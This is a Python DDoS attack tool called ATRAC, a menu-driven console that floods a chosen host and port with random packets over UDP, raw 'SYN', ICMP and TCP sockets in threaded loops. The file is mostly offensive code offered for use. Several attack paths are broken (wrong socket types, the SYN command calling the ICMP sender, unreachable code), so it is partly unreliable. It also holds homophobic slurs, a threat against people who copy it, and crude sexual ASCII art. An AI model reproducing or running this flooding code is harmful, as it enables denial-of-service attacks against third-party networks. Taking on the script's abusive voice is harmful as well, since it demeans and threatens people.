#!/usr/bin/env python3
#-*- coding: utf-8 -*-
import sys
import socket
import time
import random
import threading
import getpass
import os
# "CNC" Powered by MVBH3 <3

# Snap - mvbh3o
# Insta - MVBH3
# Youtube - MVBH3
# Discord - MVBH3#0001
# Love you guys, stay safe ;)


methods1 = """







			    \033[38;5;129m╔╦╗\033[38;5;128m╔═╗\033[38;5;127m╔╦╗\033[38;5;126m╦ ╦\033[38;5;125m╔═╗\033[38;5;125m╔╦╗\033[38;5;124m╔═╗
			    \033[38;5;129m║║║\033[38;5;128m║╣ \033[38;5;127m ║ \033[38;5;126m╠═╣\033[38;5;125m║ ║ \033[38;5;125m║║\033[38;5;124m╚═╗
			    \033[38;5;129m╩ ╩\033[38;5;128m╚═╝ \033[38;5;127m╩ \033[38;5;126m╩ ╩\033[38;5;125m╚═╝\033[38;5;125m═╩╝\033[38;5;124m╚═╝
"""

methods = """\033[35m


    	    \033[38;5;14m╔══\033[34m══════════════════════════════════════════════════\033[38;5;14m══╗
    	    \033[38;5;14m║                     \033[35mDDOS Shit\033[35m                        \033[38;5;14m║
	    \033[34m║══════════════════════════════════════════════════════║
	    \033[34m║ \033[35mUDP (HOST) (PORT) (TIME) (SIZE)  \033[35m|\033[35m UDP Attack.\033[35m       \033[34m║
	    \033[34m║ \033[35mSYN (HOST) (PORT) (TIME) (SIZE)  \033[35m|\033[35m SYN Attack.\033[35m       \033[34m║
	    \033[34m║ \033[35mICMP (HOST) (PORT) (TIME) (SIZE) \033[35m|\033[35m ICMP Attack.\033[35m      \033[34m║         
	    \033[38;5;14m║ \033[35mHTTP - Please Exit And Type "Perl Http.pl".         \033[35m \033[38;5;14m║
	    \033[38;5;14m╚══\033[34m══════════════════════════════════════════════════\033[38;5;14m══╝\033[35m






"""

info1 = """







				  \033[38;5;129m╦╔\033[38;5;128m╗╔\033[38;5;127m╔═╗\033[38;5;126m╔═\033[38;5;125m╗
				  \033[38;5;129m║║\033[38;5;128m║║\033[38;5;127m╠╣ \033[38;5;126m║ \033[38;5;125m║
				  \033[38;5;129m╩╝\033[38;5;128m╚╝\033[38;5;127m╚  \033[38;5;126m╚═\033[38;5;125m╝


"""
info = """\033[34m


    	   \033[38;5;14m╔══\033[34m══════════════════════════════════════════════════\033[38;5;14m══╗
    	   \033[38;5;14m║                      \033[35mATRAC Shit                      \033[38;5;14m║
    	   \033[34m║══════════════════════════════════════════════════════║
    	   \033[34m║ \033[35m[~] Atrac Was Made By \033[38;5;14mMVBH3 \033[35m~~ ENJOY!\033[35m                \033[34m║
    	   \033[34m║ \033[35m[~] Discord: \033[38;5;14mMVBH3#3302.\033[35m                             \033[34m║
    	   \033[34m║ \033[35m[~] Instagram: \033[38;5;14mMVBH3.\033[35m                                \033[34m║
    	   \033[38;5;14m║ \033[35m[~] YouTube: \033[38;5;14mMVBH3.\033[35m                                  \033[38;5;14m║
    	   \033[38;5;14m╚══\033[34m══════════════════════════════════════════════════\033[38;5;14m══╝\033[34m





"""
extras1 = """






			     \033[38;5;129m╔═╗\033[38;5;128m═╗ ╦\033[38;5;127m╔╦╗\033[38;5;126m╦═╗\033[38;5;125m╔═╗\033[38;5;124m╔═╗
			     \033[38;5;129m║╣ \033[38;5;128m╔╩╦╝ \033[38;5;127m║ \033[38;5;126m╠╦╝\033[38;5;125m╠═╣\033[38;5;124m╚═╗
			     \033[38;5;129m╚═╝\033[38;5;128m╩ ╚═ \033[38;5;127m╩ \033[38;5;126m╩╚═\033[38;5;125m╩ ╩\033[38;5;124m╚═╝

"""
extras = """\033[34m


    	   \033[38;5;14m╔══\033[34m══════════════════════════════════════════════════\033[38;5;14m══╗
    	   \033[38;5;14m║                      \033[35mExtra Shit\033[35m                      \033[38;5;14m║
    	   \033[34m║══════════════════════════════════════════════════════║
    	   \033[34m║ \033[35mAttacks        \033[34m|\033[35m Shows How Many Running Attacks.\033[35m     \033[34m║
    	   \033[34m║ \033[35mStop           \033[34m|\033[35m Stops All Running Attacks.\033[35m          \033[34m║
    	   \033[38;5;14m║ \033[35mResolve (HOST) \033[34m|\033[35m Grabs A Domains IP.\033[35m                 \033[38;5;14m║
    	   \033[38;5;14m╚══\033[34m══════════════════════════════════════════════════\033[38;5;14m══╝\033[35m





"""
help1 = """







			         \033[38;5;129m╦ ╦\033[38;5;128m╔═╗\033[38;5;127m╦  \033[38;5;126m╔═╗
			         \033[38;5;129m╠═╣\033[38;5;128m║╣ \033[38;5;127m║  \033[38;5;126m╠═╝
			         \033[38;5;129m╩ ╩\033[38;5;128m╚═╝\033[38;5;127m╩═╝\033[38;5;126m╩  

"""
help = """\033[34m


    	   ╔══════════════════════════════════════════════════════╗
    	   ║                    \033[35mBasic Shit\033[34m                        ║
    	   ║══════════════════════════════════════════════════════║
    	   ║ \033[35mMethods \033[34m|\033[34m Shows DDOS \033[38;5;14mMethods \033[34mto Be A Social Reject.\033[34m  ║
    	   ║ \033[35mExtras  \033[34m|\033[34m Shows Extra Commands For \033[38;5;14mATRAC.\033[34m            ║
    	   ║ \033[35mUpdates \033[34m|\033[34m Shows Update Notes For \033[38;5;14mATRAC.\033[34m              ║
    	   ║ \033[35mInfo    \033[34m|\033[34m Shows \033[38;5;14mATRAC \033[34mInfo.\033[34m                          ║
    	   ║ \033[35mClear   \033[34m|\033[34m \033[38;5;14mClears \033[34mScreen.\033[34m                             ║
    	   ║ \033[35mExit    \033[34m|\033[34m Exits Out Of \033[38;5;14mATRAC.\033[34m                        ║
    	   ╚══════════════════════════════════════════════════════╝\033[34m




"""
updates1 = """







			    \033[38;5;129m╦ ╦\033[38;5;128m╔═╗\033[38;5;129m╔╦╗\033[38;5;127m╔═╗\033[38;5;126m╔╦╗\033[38;5;125m╔═╗\033[38;5;124m╔═╗
			    \033[38;5;129m║ ║\033[38;5;128m╠═╝\033[38;5;129m ║║\033[38;5;127m╠═╣\033[38;5;126m ║ \033[38;5;125m║╣ \033[38;5;124m╚═╗
			    \033[38;5;129m╚═╝\033[38;5;128m╩  \033[38;5;129m═╩╝\033[38;5;127m╩ ╩\033[38;5;126m ╩ \033[38;5;125m╚═╝\033[38;5;124m╚═╝

"""
updatenotes = """\033[35m


    	   \033[38;5;14m╔══\033[34m══════════════════════════════════════════════════\033[38;5;14m══╗
    	   \033[38;5;14m║                     \033[35mUpdate Shit\033[35m                      \033[38;5;14m║
    	   \033[34m║══════════════════════════════════════════════════════║  
    	   \033[34m║ \033[34m[~] \033[35mThis Shits Made By MV.\033[34m                           \033[34m║
    	   \033[34m║ \033[34m[~] \033[35mDDoS Is For Faggots.\033[35m                             \033[34m║
    	   \033[34m║ \033[34m[~] \033[35mUser And Pass Changed To ATRAC.\033[35m                  \033[34m║
    	   \033[34m║ \033[34m[~] \033[35mWorlds BEST L7 In A Perl Script.\033[34m                 \033[34m║
    	   \033[38;5;14m║ \033[34m[~] \033[35mYou Skid This Shit I'll Find Your Family.\033[34m        \033[38;5;14m║
    	   \033[38;5;14m╚══\033[34m══════════════════════════════════════════════════\033[38;5;14m══╝\033[34m




"""

banner = """
         

                           \033[38;5;129m▄▄▄· ▄▄▄▄▄▄▄▄   ▄▄▄·  ▄▄· 
                          \033[38;5;128m▐█ ▀█ •██  ▀▄ █·▐█ ▀█ ▐█ ▌▪
                          \033[38;5;127m▄█▀▀█  ▐█.▪▐▀▀▄ ▄█▀▀█ ██ ▄▄
                          \033[38;5;126m▐█ ▪▐▌ ▐█▌·▐█•█▌▐█ ▪▐▌▐███▌
                          \033[38;5;125m ▀  ▀  ▀▀▀ .▀  ▀ ▀  ▀ ·▀▀▀ \033[1;32m☬ 
            \033[38;5;14m╔════\033[38;5;129m═════════════════════════════════════════════\033[38;5;129m════╗
            \033[38;5;14m║\033[38;5;125m- - - - -     \033[1;34mType Help To See Commands     \033[38;5;125m- - - - -\033[38;5;129m║
            \033[38;5;129m║\033[38;5;125m- - - - -     \033[1;34mATRAC, Developed By \033[1;35mMVBH3     \033[38;5;125m- - - - -\033[38;5;14m║
            \033[38;5;129m╚═════════════════════════════════════════════════\033[38;5;14m════╝
				


				  
			
"""


cookie = open(".MVBH3's.Cookie","w+")

fsubs = 0
liips = 0
tattacks = 0
uaid = 0
said = 0
iaid = 0
haid = 0
aid = 0
attack = True
http = True
udp = True
syn = True
icmp = True


def synsender(host, port, timer, punch):
	global said
	global syn
	global aid
	global tattacks
	timeout = time.time() + float(timer)
	sock = socket.socket (socket.AF_INET, socket.SOCK_RAW, socket.TCP_SYNCNT)

	said += 1
	tattacks += 1
	aid += 1
	while time.time() < timeout and syn and attack:
		sock.sendto(punch, (host, int(port)))
	said -= 1
	aid -= 1

def udpsender(host, port, timer, punch):
	global uaid
	global udp
	global aid
	global tattacks

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	
	uaid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and udp and attack:
		sock.sendto(punch, (host, int(port)))
	uaid -= 1
	aid -= 1

def icmpsender(host, port, timer, punch):
	global iaid
	global icmp
	global aid
	global tattacks

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

	iaid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and icmp and attack:
		sock.sendto(punch, (host, int(port)))
	iaid -= 1
	aid -= 1

def httpsender(host, port, timer, punch):
	global haid
	global http
	global aid
	global tattacks

	timeout = time.time() + float(timer)

	haid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and icmp and attack:
		try:
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			sock.sendto(punch, (host, int(port)))
			sock.close()
		except socket.error:
			pass

	haid -= 1
	aid -= 1


def main():
	global fsubs
	global liips
	global tattacks
	global uaid
	global said
	global iaid
	global haid
	global aid
	global attack
	global dp
	global syn
	global icmp
	global http

	while True:
		sys.stdout.write("\x1b]2;Atrac | More Then A Project | By MVBH3\x07")
		sin = input("\033[38;5;88m╔═\033[1;32m[\033[1;34mMVBH3\033[38;5;196m💔\033[1;34mATRAC\033[1;32m]\n\033[38;5;89m╚\033[38;5;90m═\033[38;5;91m═\033[38;5;92m═\033[38;5;93m═\033[38;5;14m⮞\033[1;32m").lower()
		sinput = sin.split(" ")[0]
		if sinput == "clear":
			os.system ("clear")
			print (banner)
			main()
		elif sinput == "help":
			os.system("clear")
			print (help1)
			time.sleep(1)
			os.system("clear")
			print (help)
			main()
		elif sinput == "extras":
			os.system("clear")
			print (extras1)
			time.sleep(1)
			os.system("clear")
			print (extras)
			main()
		elif sinput == "exit": 
			print ("[\033[35mSkid\033[35m] You Are Exiting Out Of ATRAC.\n")                                                                        
			print ("                                  Made By MVBH3                        		")
			print ("	       ________¶¶111¶_______________¶¶¶¶111111111¶¶¶1____		")
			print ("	      _____¶1¶¶¶¶¶111111¶_________¶¶¶1¶¶¶11111111¶1¶¶___		")
			print ("	      ___¶¶¶1¶1111111111¶¶1______¶¶1¶¶¶1111111111111¶¶__		")
			print ("	      ___¶¶1¶¶1111111111111¶¶_____¶¶¶1¶¶¶¶1111111111111¶_		")
			print ("              ___¶¶_¶1111111111111111¶¶___¶¶¶¶¶¶11¶111111111111¶_		")
			print ("	     _11_¶11111111111111111¶¶_____¶¶¶¶__¶111111111111¶¶			")
			print ("	      ¶¶¶¶1111111111111111¶¶¶¶_____1¶¶__11111111111111¶¶		")
			print ("	      ¶¶¶¶11111111111¶¶¶¶¶¶¶______1¶1¶¶1111111111111111¶		")
			print ("	      ¶¶1¶1111111111111¶¶¶¶¶¶_____¶¶¶¶¶¶11111111111111¶¶		")
			print ("	      ¶¶11111111111111111111111¶¶___¶¶¶¶¶¶1111111111¶¶¶_		")
			print ("	      _1¶111111111111111111¶¶¶¶¶¶____¶¶¶¶11111111111¶1__		")
			print ("	      __¶¶11111111111111111¶¶¶_____¶¶¶1111111111111¶1___		")
			print ("	      ___¶¶¶111111111111¶1¶¶¶____1¶¶111¶1111111¶11¶1____		")
			print ("	      ____1¶¶¶11111111111¶¶¶¶111¶¶¶¶111111111¶11¶¶¶_____		")
			print ("	      ______¶¶¶¶1111111111111¶¶¶¶1¶¶¶¶¶¶¶¶11¶11¶¶_______		")
			print ("	      _______¶¶¶¶¶11111111111¶111¶___¶¶¶111¶1¶¶¶________		")
			print ("	      _________¶¶¶¶¶¶111111111111¶__¶¶¶111¶¶¶1__________		")
			print ("	      ____________1¶¶¶¶¶11111111¶¶_¶¶¶¶111¶¶____________		")
			print ("	      ______________¶¶¶¶¶¶¶1111111_¶¶¶11¶¶1_____________		")
			print ("	      _________________1¶¶¶¶¶¶1111¶¶¶1¶¶¶¶______________		")
			print ("	      ____________________¶¶¶¶¶¶1¶¶¶¶¶1¶________________		")
			print ("	      _______________________¶1¶¶¶1¶¶¶__________________		")
			print ("	      ___________________________11¶____________________		")
			print ("\033[34mCome Again soon ;)			\033[34m")
			
                                                         
			exit()
		elif sinput == "methods":
			os.system("clear")
			print (methods1)
			time.sleep(1)
			os.system("clear")
			print (methods)
			main()
		elif sinput == "updates":
			os.system("clear")
			print (updates1)
			time.sleep(1)
			os.system("clear")
			print (updatenotes)
			main()
		elif sinput == "info":
			os.system("clear")
			print (info1)
			time.sleep(1)
			os.system("clear")
			print (info)
			main()
		elif sinput == "attacks":
			print ("[\033[35mSkid\033[35m] Faggots Slammed: {}\n".format (aid))
			main()
		elif sinput == "resolve":
			liips += 1
			host = sin.split(" ")[1]
			host_ip = socket.gethostbyname(host)
			print ("[\033[34mSkid\033[34m] Host: {} \033[34m[\033[35mConverted\033[34m] {}\n".format (host, host_ip))
			main()
		elif sinput == "udp":
			if username == "Guest":
				print ("[\033[91mSkid\033[00m] You Are Not Allowed To Use This Method.\n")
				main()
			else:
				try:
					sinput, host, port, timer, pack = sin.split(" ")
					socket.gethostbyname(host)
					print ("\033[34m[Skid\033[34m] You Fucked: {}\n".format (host))
					punch = random._urandom(int(pack))
					threading.Thread(target=udpsender, args=(host, port, timer, punch)).start()
					print ("                  |  |")
					print ("                  |  /")
					print ("                   |/")
					time.sleep(1)
					print(" ")
					print(" ")
					print(" ")
					print("                       / **/|")
					print("                       | == /|")
					print("                       |  |")
					print("                       |  |")
					print("                       |  /")
					print("                        |/")
					time.sleep(1)
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print("                 / **/|")
					print("                 | == /|")
					print("                  |  |")
					print("                  |  |")
					print("                  |  /")
					print("                   |/")
					time.sleep(1)
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print("                         / **/|")
					print("                         | == /|")
					print("                         |  |")
					print("                         |  |")
					print("                         |  /")
					print("                          |/")
					time.sleep(1)
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print("                             / **/|")
					print("                             | == /|")
					print("                              |  |")
					print("                              |  |")
					print("                              |  /")
					print("                               |/")
					time.sleep(1)
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print("                                .-=||  | |=-.")
					print("                                `-=#$%&%$#=-'")
					print("                                   | ;  :|")
					print("                          _____.,-#%&$@%#&#~,._____")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					time.sleep(1)
					print("\033[35m                             _.-^^---....,,-- ")     
					print("\033[35m                          _--                  --_ ") 
					print("\033[35m                          <                        >)")
					print("\033[35m                          |                        |")
					print("\033[35m                           /._                   _./")
					print("\033[35m                              ```--. . , ; .--'''   ")
					print("\033[35m                                   | |   |          ")
					print("\033[35m                                .-=||  | |=-.       ")
					print("\033[35m                                `-=#$%&%$#=-'       ")
					print("\033[35m                                   | ;  :|          ")
					print("\033[35m                          _____.,-#%&$@%#&#~,._____ ")
					print("                                 \033[35m A T R A C \033[35m")
					print(" ")
					print ("                           \033[34m[Skid\033[34m] RIP To: {}\n".format (host))
					time.sleep(2)
					os.system ("clear")
					print (banner)
					main()
				except ValueError:
					print ("[\033[34mSkid\033[34m] The Command {} Requires An Argument Dumb Fuck.\n".format (sinput))
					main()
				except socket.gaierror:
					print ("[\033[34mSkid\033[34m] Host: {} Invalid.\n".format (host))
					
		elif sinput == "http": #Custom HTTP Method... Enjoy <3
			try:
				sinput, host, port, timer, pack = sin.split(" ")
				socket.gethostbyname(host)
				print ("\033[34m[Skid\033[34m] You Fucked: {}\n".format (host))
				punch = random._urandom(int(pack))
				threading.Thread(target=udpsender, args=(host, port, timer, punch)).start()
				print ("                  |  |")
				print ("                  |  /")
				print ("                   |/")
				time.sleep(1)
				print(" ")
				print(" ")
				print(" ")
				print("                       / **/|")
				print("                       | == /|")
				print("                       |  |")
				print("                       |  |")
				print("                       |  /")
				print("                        |/")
				time.sleep(1)
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print("                 / **/|")
				print("                 | == /|")
				print("                  |  |")
				print("                  |  |")
				print("                  |  /")
				print("                   |/")
				time.sleep(1)
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print("                         / **/|")
				print("                         | == /|")
				print("                         |  |")
				print("                         |  |")
				print("                         |  /")
				print("                          |/")
				time.sleep(1)
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print("                             / **/|")
				print("                             | == /|")
				print("                              |  |")
				print("                              |  |")
				print("                              |  /")
				print("                               |/")
				time.sleep(1)
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print("                                .-=||  | |=-.")
				print("                                `-=#$%&%$#=-'")
				print("                                   | ;  :|")
				print("                          _____.,-#%&$@%#&#~,._____")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				time.sleep(1)
				print("\033[35m                             _.-^^---....,,-- ")     
				print("\033[35m                          _--                  --_ ") 
				print("\033[35m                          <                        >)")
				print("\033[35m                          |                        |")
				print("\033[35m                           /._                   _./")
				print("\033[35m                              ```--. . , ; .--'''   ")
				print("\033[35m                                   | |   |          ")
				print("\033[35m                                .-=||  | |=-.       ")
				print("\033[35m                                `-=#$%&%$#=-'       ")
				print("\033[35m                                   | ;  :|          ")
				print("\033[35m                          _____.,-#%&$@%#&#~,._____ ")
				print("                                 \033[35m A T R A C \033[35m")
				print(" ")
				print ("                           \033[34m[Skid\033[34m] RIP To: {}\n".format (host))
				time.sleep(2)
				os.system ("clear")
				print (banner)
				main()

				punch = random._urandom(int(pack))
				threading.Thread(target=httpsender, args=(host, port, timer, punch)).start()
			except ValueError:
				print ("[\033[34mSkid\033[34m] The Command {} Requires An Argument Dumb Fuck.\n".format (sinput))
				main()
			except socket.gaierror:
				print ("[\033[34mSkid\033[34m] Host: {} Invalid.\n".format (host))
				main()
		elif sinput == "icmp":
			if username == "Guest":
				print ("[\033[34mSkid\033[34m] You Are Not Allowed To Use This Method.\n")
				main()
			else:
				try:
					sinput, host, port, timer, pack = sin.split(" ")
					socket.gethostbyname(host)
					punch = random._urandom(int(pack))
					threading.Thread(target=icmpsender, args=(host, port, timer, punch)).start()
					print ("\033[34m[Skid\033[34m] You Fucked: {}\n".format (host))
					print ("                  |  |")
					print ("                  |  /")
					print ("                   |/")
					time.sleep(1)

					print(" ")
					print(" ")
					print(" ")
					print("                       / **/|")
					print("                       | == /|")
					print("                       |  |")
					print("                       |  |")
					print("                       |  /")
					print("                        |/")
					time.sleep(1)

					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print("                 / **/|")
					print("                 | == /|")
					print("                  |  |")
					print("                  |  |")
					print("                  |  /")
					print("                   |/")
					time.sleep(1)

					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print("                         / **/|")
					print("                         | == /|")
					print("                         |  |")
					print("                         |  |")
					print("                         |  /")
					print("                          |/")
					time.sleep(1)

					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print("                             / **/|")
					print("                             | == /|")
					print("                              |  |")
					print("                              |  |")
					print("                              |  /")
					print("                               |/")
					time.sleep(1)
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print("                                .-=||  | |=-.")
					print("                                `-=#$%&%$#=-'")
					print("                                   | ;  :|")
					print("                          _____.,-#%&$@%#&#~,._____")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					print(" ")
					time.sleep(1)
					print("\033[35m                             _.-^^---....,,-- ")     
					print("\033[35m                          _--                  --_ ") 
					print("\033[35m                          <                        >)")
					print("\033[35m                          |                        |")
					print("\033[35m                           /._                   _./")
					print("\033[35m                              ```--. . , ; .--'''   ")
					print("\033[35m                                   | |   |          ")
					print("\033[35m                                .-=||  | |=-.       ")
					print("\033[35m                                `-=#$%&%$#=-'       ")
					print("\033[35m                                   | ;  :|          ")
					print("\033[35m                          _____.,-#%&$@%#&#~,._____ ")
					print("                                 \033[35m A T R A C \033[35m")
					print(" ")
					print ("                           \033[34m[Skid\033[34m] RIP To: {}\n".format (host))
					time.sleep(2)
					os.system ("clear")
					print (banner)
					main()

					punch = random._urandom(int(pack))
					threading.Thread(target=icmpsender, args=(host, port, timer, punch)).start()
				except ValueError:
					print ("[\033[35mSkid\033[035m] The Command {} Requires An Argument Dumb Fuck.\n".format (sinput))
					main()
				except socket.gaierror:
					print ("[\033[35mSkid\033[35m] Host: {} Invalid.\n".format (host))
					main()
		elif sinput == "syn":
			try:
				sinput, host, port, timer, pack = sin.split(" ")
				socket.gethostbyname(host)
				punch = random._urandom(int(pack))
				threading.Thread(target=icmpsender, args=(host, port, timer, punch)).start()
				print ("\033[34m[Skid\033[34m] You Fucked: {}\n".format (host))
				print ("                  |  |")
				print ("                  |  /")
				print ("                   |/")
				time.sleep(1)

				print(" ")
				print(" ")
				print(" ")
				print("                       / **/|")
				print("                       | == /|")
				print("                       |  |")
				print("                       |  |")
				print("                       |  /")
				print("                        |/")
				time.sleep(1)

				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print("                 / **/|")
				print("                 | == /|")
				print("                  |  |")
				print("                  |  |")
				print("                  |  /")
				print("                   |/")
				time.sleep(1)

				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print("                         / **/|")
				print("                         | == /|")
				print("                         |  |")
				print("                         |  |")
				print("                         |  /")
				print("                          |/")
				time.sleep(1)

				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print("                             / **/|")
				print("                             | == /|")
				print("                              |  |")
				print("                              |  |")
				print("                              |  /")
				print("                               |/")
				time.sleep(1)
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print("                                .-=||  | |=-.")
				print("                                `-=#$%&%$#=-'")
				print("                                   | ;  :|")
				print("                          _____.,-#%&$@%#&#~,._____")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				print(" ")
				time.sleep(1)
				print("\033[35m                             _.-^^---....,,-- ")     
				print("\033[35m                          _--                  --_ ") 
				print("\033[35m                          <                        >)")
				print("\033[35m                          |                        |")
				print("\033[35m                           /._                   _./")
				print("\033[35m                              ```--. . , ; .--'''   ")
				print("\033[35m                                   | |   |          ")
				print("\033[35m                                .-=||  | |=-.       ")
				print("\033[35m                                `-=#$%&%$#=-'       ")
				print("\033[35m                                   | ;  :|          ")
				print("\033[35m                          _____.,-#%&$@%#&#~,._____ ")
				print("                                 \033[35m A T R A C \033[35m")
				print(" ")
				print ("                           \033[34m[Skid\033[34m] RIP To: {}\n".format (host))
				time.sleep(2)
				os.system ("clear")
				print (banner)
				main()

				punch = random._urandom(int(pack))
				threading.Thread(target=icmpsender, args=(host, port, timer, punch)).start()
				
			except ValueError:
				print ("[\033[34mSkid\033[34m] The Command {} Is Wrong Dumb Fuck.\n".format (sinput))
				main()
			except socket.gaierror:
				print ("[\033[91mSkid\033[00m] Host: {} Invalid.\n".format (host))
				main()
		elif sinput == "stop":
			print ("[\033[34mSkid\033[34m] All Running Attacks Have Ended.\n")
			attack = False
			while not attack:
				if aid == 0:
					attack = True
		elif sinput == "stop":
			what = sin.split(" ")[1]
			if what == "udp":
				print ("Stopped All Attacks\n")
				udp = False
				while not udp:
					if aid == 0:
						print ("[\033[34mSkid\033[34m] No UDP Processes Running.")
						udp = True
						main()
			if what == "icmp":
				print ("Stopping All ICMP Attacks.\n")
				icmp = False
				while not icmp:
					print ("[\033[34mSkid\033[34m] No ICMP Processes Running.")
					udp = True
					main()
		else:
			print ("[\033[34mSkid\033[34m] {} Is Not A Command Dumb Fuck.\n".format(sinput))
			main()



try:
	users = ["ATRAC", "ATRAC"]
	clear = "clear"
	os.system (clear)
	username = getpass.getpass ("[+] Username: ")
	if username in users:
		user = username
	else:
		print ("\033[34m[+] Incorrect, Try Again Next Time Skid ;).\n")
		print (" 									")
		print (" \033[34m    * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * ")                                                                        
		print (" 									")
		print (" \033[34m                                 Made By MVBH3                         ")
		print ("                                                                        ")
		print ("                                                                        ")
		print ("                                                                        ")
		print ("\033[35m		██╗███╗   ██╗██╗   ██╗ █████╗ ██╗     ██╗██████╗        ")
		print ("\033[35m		██║████╗  ██║██║   ██║██╔══██╗██║     ██║██╔══██╗       ")
		print ("\033[35m		██║██╔██╗ ██║██║   ██║███████║██║     ██║██║  ██║       ")
		print ("\033[35m		██║██║╚██╗██║╚██╗ ██╔╝██╔══██║██║     ██║██║  ██║       ")
		print ("\033[35m		██║██║ ╚████║ ╚████╔╝ ██║  ██║███████╗██║██████╔╝       ")
		print ("\033[35m		╚═╝╚═╝  ╚═══╝  ╚═══╝  ╚═╝  ╚═╝╚══════╝╚═╝╚═════╝        ")
		print (" 									")
		print (" 									")
		print (" 									")
		print (" 									")
		print (" 									")                                
		exit()
except KeyboardInterrupt:
	exit()
try:
	passwords = ["ATRAC", "ATRAC"]
	password = getpass.getpass ("[+] Password: ")
	if user == "ATRAC":
		if password == passwords[0]:
			print ("\033[34m[+] Skid Shit Granted.")
			print ("\033[34m[+] Type Help To See Commands for ATRAC ;).")
			titties = """
          MM::::::::8888M:::8888:::::888888888888::::::::Mm8     
          8M:::::::8888M:::::888:::::::88:::8888888::::::::Mm    
         88MM:::::8888M:::::::88::::::::8:::::888888:::M:::::M
        8888M:::::888MM::::::::8:::::::::::M::::8888::::M::::M
       88888M:::::88:M::::::::::8:::::::::::M:::8888::::::M::M
      88 888MM:::888:M:::::::::::::::::::::::M:8888:::::::::M:
      8 88888M:::88::M:::::::::::::::::::::::MM:88::::::::::::M
        88888M:::88::M::::::::::*88*::::::::::M:88::::::::::::::M
       888888M:::88::M:::::::::88\033[35m@@\033[35m\033[34m88:::::::::M::88::::::::::::::M
       888888MM::88::MM::::::::88\033[35m@@\033[35m\033[34m88:::::::::M:::8::::::::::::::*8
       88888  M:::8::MM:::::::::*88*::::::::::M:::::::::::::::::88\033[35m@@\033[35m \033[34m
       8888   MM::::::MM:::::::::::::::::::::MM:::::::::::::::::88\033[35m@@\033[35m \033[34m
        \033[34m888    M:::::::MM:::::::::::::::::::MM::M::::::::::::::::*8
        888    MM:::::::MMM::::::::::::::::MM:::MM:::::::::::::::M
         88     M::::::::MMMM:::::::::::MMMM:::::MM::::::::::::MM
          88    MM:::::::::MMMMMMMMMMMMMMM::::::::MMM::::::::MMM
           88    MM::::::::::::MMMMMMM::::::::::::::MMMMMMMMMM
            88   8MM::::::::::::::::::::::::::::::::::MMMMMM
             8   88MM::::::::::::::::::::::M:::M::::::::MM
                888MM::::::::::::::::::MM::::::MM::::::MM
"""
			print(titties)
			cookie.write("DIE")
			time.sleep(3)
